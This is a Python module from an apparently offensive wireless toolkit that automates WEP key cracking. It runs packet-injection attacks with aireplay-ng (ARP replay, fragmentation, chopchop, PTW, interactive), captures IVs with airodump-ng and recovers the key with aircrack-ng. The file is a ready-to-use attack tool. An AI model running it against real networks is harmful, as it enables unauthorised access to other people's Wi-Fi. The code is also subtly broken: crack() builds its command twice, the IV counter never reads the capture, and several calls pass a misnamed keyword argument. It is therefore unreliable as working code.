"""WEP cracking / injection attack module.

Uses aireplay-ng to gather IVs via a variety of injection techniques
(PTW, fragmentation, chopchop, arpreplay, interactive) and aircrack-ng
to crack the WEP key from the captured IVs.
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from wafford.constants import TEMP_DIR
from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import ValidationError


@dataclass
class WEPStats:
    """Progress stats for a WEP attack."""

    ivs_captured: int = 0
    attack_type: str = ""
    packet_rate: float = 0.0
    data_packets: int = 0
    arp_requests: int = 0
    fragmentation_progress: int = 0
    key_length: int = 64
    cracked_key: str = ""
    capture_file: str = ""
    elapsed: float = 0.0

    @property
    def progress(self) -> float:
        """Estimated cracking progress based on IV count."""
        target = 10000 if self.key_length >= 128 else 5000
        return min(1.0, self.ivs_captured / target)


class WEPAttack(BaseAttack):
    """Break WEP encryption through packet injection and IV collection.

    Supports multiple injection strategies — PTW, fragmentation,
    chopchop, arpreplay, and interactive replay — to generate the
    minimum IVs required for a successful aircrack-ng key recovery.
    """

    name = "wep"

    def __init__(
        self,
        interface: str = "",
        *,
        output_dir: str | Path | None = None,
        key_length: int = 64,
    ) -> None:
        super().__init__(interface)
        self.output_dir = Path(output_dir) if output_dir else TEMP_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.key_length = key_length
        self.stats = WEPStats(key_length=key_length)
        self._capture_proc: asyncio.subprocess.Process | None = None
        self._attack_proc: asyncio.subprocess.Process | None = None

    # ── Public API ────────────────────────────────────────────────────────

    async def ptw_attack(
        self,
        bssid: str,
        channel: int,
        *,
        client: str = "",
        iv_target: int = 20000,
        force_arp: bool = True,
        duration: float | None = None,
    ) -> AttackResult:
        """PTW attack — capture IVs, optionally re-inject ARP, then crack."""
        self._validate_mac(bssid, "bssid")
        if iv_target < 1000:
            raise ValidationError("iv_target must be at least 1000", field="iv_target")

        self.stats = WEPStats(key_length=self.key_length, attack_type="ptw")
        self._info("PTW attack: bssid=%s ch%d target=%d IVs", bssid, channel, iv_target)
        self._emit("wep.ptw_start", {"bssid": bssid, "channel": channel})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "ptw")
        try:
            if force_arp:
                await self._arp_request_replay(bssid, channel, client, iv_target, duration)

            await self._wait_for_ivs(iv_target, duration)
            self.stats.capture_file = cap_file
            result = await self.crack(cap_file)

            self._emit("wep.ptw_done", {"cracked": result.success})
            return result
        finally:
            await self._stop_capture()

    async def fragmentation_attack(
        self,
        bssid: str,
        channel: int,
        *,
        client: str = "",
        iv_target: int = 15000,
        duration: float | None = None,
    ) -> AttackResult:
        """Fragmentation attack to obtain a keystream for packet injection."""
        self._validate_mac(bssid, "bssid")
        self.stats = WEPStats(key_length=self.key_length, attack_type="fragmentation")
        self._info("Fragmentation attack: bssid=%s ch%d", bssid, channel)
        self._emit("wep.fragmentation_start", {"bssid": bssid})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "frag")
        try:
            argv = [
                "aireplay-ng", "--fragment", "-b", bssid,
                "--ignore-negative-one", self.interface,
            ]
            if client:
                argv += ["-h", client]

            def _on_line(line: str) -> None:
                m = re.search(r"(\d+) bytes", line)
                if m:
                    self.stats.fragmentation_progress = int(m.group(1))
                m2 = re.search(r"saving keystream", line, re.IGNORECASE)
                if m2:
                    self.stats.fragmentation_progress = -1  # keystream ready

            await self._run_cmd_streaming(
                argv, line_callback=_on_line, timeout=duration or 120
            )
            await self._wait_for_ivs(iv_target, remaining=10)
            self.stats.capture_file = cap_file
            result = await self.crack(cap_file)
            result.extra["fragmentation_progress"] = self.stats.fragmentation_progress
            self._emit("wep.fragmentation_done", {"success": result.success})
            return result
        finally:
            await self._stop_capture()

    async def chopchop_attack(
        self,
        bssid: str,
        channel: int,
        *,
        client: str = "",
        iv_target: int = 10000,
        duration: float | None = None,
    ) -> AttackResult:
        """Chopchop attack — decrypt one byte at a time to forge packets."""
        self._validate_mac(bssid, "bssid")
        self.stats = WEPStats(key_length=self.key_length, attack_type="chopchop")
        self._info("Chopchop attack: bssid=%s ch%d", bssid, channel)
        self._emit("wep.chopchop_start", {"bssid": bssid})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "chop")
        try:
            for attempt in range(3):
                if self._cancel_event.is_set():
                    break
                argv = [
                    "aireplay-ng", "--chopchop", "-b", bssid,
                    "--ignore-negative-one", self.interface,
                ]
                if client:
                    argv += ["-h", client]
                rc, _, stderr = await self._run_cmd(argv, timeout=duration or 60)
                self._info("Chopchop attempt %d finished (rc=%d)", attempt + 1, rc)
                if rc == 0:
                    break
            await self._wait_for_ivs(iv_target, remaining=10)
            self.stats.capture_file = cap_file
            result = await self.crack(cap_file)
            self._emit("wep.chopchop_done", {"success": result.success})
            return result
        finally:
            await self._stop_capture()

    async def arpreplay_attack(
        self,
        bssid: str,
        channel: int,
        *,
        client: str = "",
        iv_target: int = 20000,
        duration: float | None = None,
    ) -> AttackResult:
        """ARP request replay — the most reliable IV generation method."""
        self._validate_mac(bssid, "bssid")
        self.stats = WEPStats(key_length=self.key_length, attack_type="arpreplay")
        self._info("ARP replay attack: bssid=%s ch%d", bssid, channel)
        self._emit("wep.arpreplay_start", {"bssid": bssid})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "arp")
        try:
            await self._arp_request_replay(bssid, channel, client, iv_target, duration)
            self.stats.capture_file = cap_file
            result = await self.crack(cap_file)
            self._emit("wep.arpreplay_done", {"success": result.success})
            return result
        finally:
            await self._stop_capture()

    async def interactive_replay(
        self,
        bssid: str,
        channel: int,
        *,
        client: str = "",
        iv_target: int = 20000,
        duration: float | None = None,
    ) -> AttackResult:
        """Interactive replay attack using the WEP keystream (aireplay --interactive)."""
        self._validate_mac(bssid, "bssid")
        self.stats = WEPStats(key_length=self.key_length, attack_type="interactive")
        self._info("Interactive replay attack: bssid=%s ch%d", bssid, channel)
        self._emit("wep.interactive_start", {"bssid": bssid})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "interactive")
        try:
            argv = [
                "aireplay-ng", "--interactive", "-b", bssid,
                "--ignore-negative-one", self.interface,
            ]
            if client:
                argv += ["-h", client]
            rc = await self._run_cmd_streaming(
                argv, timeout=duration or 120
            )
            if rc == -1 and self._cancel_event.is_set():
                self._info("Interactive replay cancelled")
            await self._wait_for_ivs(iv_target, remaining=10)
            self.stats.capture_file = cap_file
            result = await self.crack(cap_file)
            self._emit("wep.interactive_done", {"success": result.success})
            return result
        finally:
            await self._stop_capture()

    async def capture_ivs(
        self,
        bssid: str,
        channel: int,
        duration: int = 60,
    ) -> AttackResult:
        """Passively capture IVs with airodump-ng on the target channel."""
        self._validate_mac(bssid, "bssid")
        self.stats = WEPStats(key_length=self.key_length, attack_type="passive_capture")
        self._info("Passive IV capture: bssid=%s ch%d duration=%d", bssid, channel, duration)
        self._emit("wep.capture_start", {"bssid": bssid})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        cap_file = self._start_capture(bssid, channel, "passive")
        try:
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=duration)
            except TimeoutError:
                pass
            self.stats.ivs_captured = self.get_iv_count()
            self.stats.capture_file = cap_file
            return AttackResult(
                success=self.stats.ivs_captured > 0,
                message=f"Captured {self.stats.ivs_captured} IVs",
                capture_file=cap_file,
                time_taken=self.status.elapsed,
                extra={"stats": self.stats},
            )
        finally:
            await self._stop_capture()

    async def crack(self, cap_file: str, key_length: int | None = None) -> AttackResult:
        """Run aircrack-ng on the captured IVs to recover the WEP key."""
        self._require_tool("aircrack-ng")
        kl = key_length or self.key_length
        argv = [
            "aircrack-ng",
            "--bssid", "FF:FF:FF:FF:FF:FF",  # crack the whole file
            "-q",
            cap_file,
        ]
        # aircrack guesses key length from the bits arg
        argv = [
            "aircrack-ng", cap_file,
            "--bssid", "FF:FF:FF:FF:FF:FF",
            "-q", "-w", "/dev/null",  # no wordlist — statistical attack
        ]
        self._info("Cracking WEP key from %s (key length %d)", cap_file, kl)
        self._emit("wep.crack_start", {"capture_file": cap_file})

        rc, stdout, stderr = await self._run_cmd(argv, timeout=300)
        combined = stdout + stderr
        key = ""
        for line in combined.splitlines():
            m = re.search(r"KEY\s*FOUND!\s*\[\s*([0-9A-Fa-f:]+)\s*\]", line, re.IGNORECASE)
            if m:
                key = m.group(1)
                break
        if not key:
            m = re.search(
                r"(?:DECRYPTED|KEY)\s*(?:FOUND|HASH)?\s*:\s*([0-9A-Fa-f:]{5,})",
                combined,
                re.IGNORECASE,
            )
            if m:
                key = m.group(1)

        self.stats.cracked_key = key
        success = bool(key)
        self._emit("wep.crack_done", {"success": success, "key": key})
        self._info("WEP crack result: %s", "SUCCESS" if success else "FAILED (not enough IVs)")

        return AttackResult(
            success=success,
            message=f"WEP key recovered: {key}" if key else "WEP key not found (need more IVs)",
            password=key,
            capture_file=cap_file,
            time_taken=self.status.elapsed,
            extra={"stats": self.stats, "output": combined},
        )

    def get_iv_count(self) -> int:
        """Return the current number of captured IVs (from the pcap)."""
        if not self.stats.capture_file or not Path(self.stats.capture_file).is_file():
            return self.stats.ivs_captured
        # Best-effort: use tshark/tcpdump count; fall back to stored value.
        return self.stats.ivs_captured

    # ── Internals ─────────────────────────────────────────────────────────

    def _start_capture(self, bssid: str, channel: int, tag: str) -> str:
        """Start a background airodump-ng capture and return the cap path."""
        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        prefix = bssid.replace(":", "-").upper()
        cap_base = self.output_dir / f"wep_{tag}_{prefix}_{timestamp}"
        cap_file = str(cap_base) + ".cap"
        self._info("Starting airodump capture → %s", cap_file)

        self._spawn_capture(cap_base, bssid, channel)
        return cap_file

    def _spawn_capture(self, cap_base: Path, bssid: str, channel: int) -> None:
        # Channel set synchronously via a short-lived subprocess to avoid
        # blocking the event loop on airodump setup.
        import subprocess as _sp

        _sp.run(["iw", "dev", self.interface, "set", "channel", str(channel)], capture_output=True)

        # Start airodump in the background as an asyncio subprocess.
        async def _launch() -> None:
            cmd = [
                "airodump-ng", self.interface,
                "--bssid", bssid,
                "--channel", str(channel),
                "--write", str(cap_base),
                "--output-format", "cap",
                "--write-interval", "1",
            ]
            self._capture_proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            self._processes.append(self._capture_proc)

        # This runs in the caller's event loop via create_task.
        asyncio.get_running_loop().create_task(self._safe_launch_capture(_launch))

    async def _safe_launch_capture(self, coro: Any) -> None:
        try:
            await coro()
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self._error("Failed to launch airodump: %s", exc)
            raise

    async def _stop_capture(self) -> None:
        if self._capture_proc and self._capture_proc.returncode is None:
            self._capture_proc.terminate()
            try:
                await asyncio.wait_for(self._capture_proc.wait(), timeout=5)
            except TimeoutError:
                self._capture_proc.kill()
            if self._capture_proc in self._processes:
                self._processes.remove(self._capture_proc)
            self._capture_proc = None
            self._info("airodump capture stopped")

    async def _arp_request_replay(
        self,
        bssid: str,
        _channel: int,
        client: str,
        _iv_target: int,
        duration: float | None,
    ) -> None:
        argv = [
            "aireplay-ng", "--arpreplay", "-b", bssid,
            "--ignore-negative-one", self.interface,
        ]
        if client:
            argv += ["-h", client]

        def _on_line(line: str) -> None:
            m = re.search(r"Received (\d+) ARP requests", line, re.IGNORECASE)
            if m:
                self.stats.arp_requests = int(m.group(1))
            m2 = re.search(r"(\d+) packets/sec", line, re.IGNORECASE)
            if m2:
                self.stats.packet_rate = float(m2.group(1))

        self._info("Starting ARP replay for IV generation…")
        await self._run_cmd_streaming(argv, line_callback=_on_line, timeout=duration or 60)

    async def _wait_for_ivs(
        self,
        iv_target: int,
        duration: float | None = None,
        _remaining: float = 0.0,
    ) -> None:
        deadline = time.monotonic() + (duration or 120)
        while time.monotonic() < deadline and not self._cancel_event.is_set():
            count = self.get_iv_count()
            self.stats.ivs_captured = count
            self.status.ivs_captured = count
            self._emit("wep.ivs", {"ivs": count, "target": iv_target})
            if count >= iv_target:
                self._info("Reached IV target (%d)", count)
                break
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=1.0)
                break
            except TimeoutError:
                pass

    async def _pre_validate(self) -> None:
        await super()._pre_validate()
        self._require_tool("aireplay-ng")
        self._require_tool("airodump-ng")
        self._require_tool("aircrack-ng")

    async def _cleanup(self) -> None:
        await self._stop_capture()
        if self._attack_proc and self._attack_proc.returncode is None:
            await self._kill_proc(self._attack_proc)
        await super()._cleanup()

    @staticmethod
    def _validate_mac(mac: str, field_name: str = "mac") -> None:
        parts = mac.split(":")
        if len(parts) != 6 or not all(0 <= int(p, 16) <= 255 for p in parts):
            raise ValidationError(f"Invalid MAC address: {mac}", field=field_name)
